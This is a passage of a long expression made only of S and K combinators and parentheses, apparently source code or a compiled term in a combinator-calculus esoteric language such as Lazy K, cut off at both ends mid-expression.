S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))))(((((S)((K)(S)))(K))((S)(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K)))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))))((K)(K)))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K))))))))(((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((((S)((K)(S)))(K))(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((((((((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)((K)(S)))(K))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)((K)((K)(((S)(K))(K)))))))))((K)(K))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((S)((K)(S)))(K))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))))))(((S)(K))(K)))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))(((S)(K))(K)))))(((((((S)((K)(S)))(K))((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(S))((((((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))(((S)((K)(S)))(K)))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K))))((((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K))))((K)(((S)(K))(K))))))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)((K)(((S)(K))(K))))(((S)((K)(S)))(K))))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))((K)(((S)(K))(K))))))))(((((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((S)(((S)((K)(S)))(K)))((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))((((S)(S))((K)(((S)(K))(K))))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))))))(((((S)((K)(S)))(K))(((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K))))(((((S)((K)(S)))(K))((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((((S)(((((S)((K)(S)))(K))(((S)((K)(S)))(K)))(S)))((K)(K)))(((S)(K))(K)))(K)))(((S)(K))(K))))))(((((S)((K)(S)))(K))((((S)((K)(S)))(K))((S)((((((S)(S))((K)(((S)